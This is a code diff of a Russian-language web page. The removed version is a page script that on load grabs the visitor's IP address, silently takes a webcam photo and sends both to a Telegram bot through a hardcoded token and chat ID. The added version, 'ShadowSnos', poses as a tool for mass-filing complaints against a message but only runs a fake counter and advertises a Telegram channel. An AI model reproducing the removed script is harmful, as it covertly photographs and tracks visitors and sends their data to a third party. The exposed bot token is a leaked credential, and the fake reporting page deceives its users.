@@ -1,68 +1,204 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <title>Автоматическое фото и отправка в Telegram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShadowSnos - Сообщить о нарушении</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #1e1e1e;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        h1 {
+            color: #ff4500;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        form {
+            background-color: #282828;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
+            width: 80%;
+            max-width: 500px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #ddd;
+        }
+
+        input[type="url"],
+        input[type="number"] {
+            width: 95%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #333;
+            color: #fff;
+        }
+
+        button {
+            background-color: #ff4500;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #cc3700;
+        }
+
+        #status, #subscription, #demon {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #ccc;
+        }
+
+        #subscription {
+            padding: 20px;
+            background-color: #333;
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        #subscription a {
+            color: #ff4500;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        #demon {
+            font-size: 100px;
+            animation: zoomIn 1s ease-out;
+        }
+
+        #mainMenuButton {
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes zoomIn {
+            from {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+    </style>
 </head>
 <body>
-<script>
-  const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
-  const chatId = '6945488830';
+    <h1>ShadowSnos</h1>
 
-  (async () => {
-    try {
-      // Получаем IP пользователя
-      const ipResp = await fetch('https://api.ipify.org?format=json');
-      const { ip } = await ipResp.json();
+    <form id="reportForm">
+        <label for="url">Ссылка на сообщение (для жалоб):</label>
+        <input type="url" id="url" name="url" placeholder="https://example.com/message/123" required>
 
-      // Запрашиваем доступ к камере
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement('video');
-      video.style.display = 'none';
-      document.body.appendChild(video);
+        <label for="count">Количество жалоб (для жалоб):</label>
+        <input type="number" id="count" name="count" value="10" min="1" required>
 
-      video.srcObject = stream;
-      await video.play();
+        <button type="submit">Отправить жалобы</button>
+    </form>
 
-      // Ждём готовности видео
-      await new Promise(resolve => {
-        if (video.readyState >= 2) resolve();
-        else video.onloadeddata = () => resolve();
-      });
+    <div id="status" class="hidden">
+        Отправлено 0/0 жалоб
+    </div>
 
-      // Создаём canvas и снимаем фото
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    <div id="subscription">
+        Подпишись на наш ТГК: <a href="https://t.me/channel_Milana_star">@channel_Milana_star</a>
+    </div>
 
-      // Формируем blob из изображения
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+    <div id="demon" class="hidden">😈</div>
+    <button id="mainMenuButton" class="hidden">Вернуться в главное меню</button>
 
-      // Останавливаем камеру
-      stream.getTracks().forEach(track => track.stop());
-      video.remove();
+    <script>
+        const form = document.getElementById('reportForm');
+        const statusDiv = document.getElementById('status');
+        const mainMenuButton = document.getElementById('mainMenuButton');
+        const demonDiv = document.getElementById('demon');
+        let complaintsSent = 0;
+        let totalComplaints = 0;
+        let intervalId;
 
-      // Подготавливаем отправку в Telegram
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('caption', `IP пользователя: ${ip}`);
-      formData.append('photo', blob, 'photo.jpg');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
 
-      // Отправка фото с подписью
-      const resp = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
+            const url = document.getElementById('url').value;
+            totalComplaints = parseInt(document.getElementById('count').value);
 
-      if (!resp.ok) throw new Error(`Ошибка отправки: ${resp.statusText}`);
+            if (isNaN(totalComplaints) || totalComplaints <= 0) {
+                alert("Пожалуйста, введите корректное количество жалоб.");
+                return;
+            }
 
-      alert('Фото успешно отправлено в Telegram');
-    } catch (err) {
-      alert('Ошибка: ' + err.message);
-    }
-  })();
-</script>
+            complaintsSent = 0;
+            statusDiv.textContent = `Отправлено 0/${totalComplaints} жалоб`;
+            statusDiv.classList.remove('hidden');
+            form.classList.add('hidden');
+            document.getElementById('subscription').classList.add('hidden');
+
+            intervalId = setInterval(function() {
+                complaintsSent++;
+                statusDiv.textContent = `Отправлено ${complaintsSent}/${totalComplaints} жалоб`;
+
+                if (complaintsSent >= totalComplaints) {
+                    clearInterval(intervalId);
+                    statusDiv.textContent = "Жалобы успешно отправлены!";
+                    demonDiv.classList.remove('hidden');
+                    mainMenuButton.classList.remove('hidden');
+                }
+            }, 1000);
+        });
+
+        mainMenuButton.addEventListener('click', function() {
+            clearInterval(intervalId);
+            form.classList.remove('hidden');
+            document.getElementById('subscription').classList.remove('hidden');
+            statusDiv.classList.add('hidden');
+            demonDiv.classList.add('hidden');
+            mainMenuButton.classList.add('hidden');
+            document.getElementById('url').value = "";
+            document.getElementById('count').value = "10";
+        });
+    </script>
 </body>
 </html>
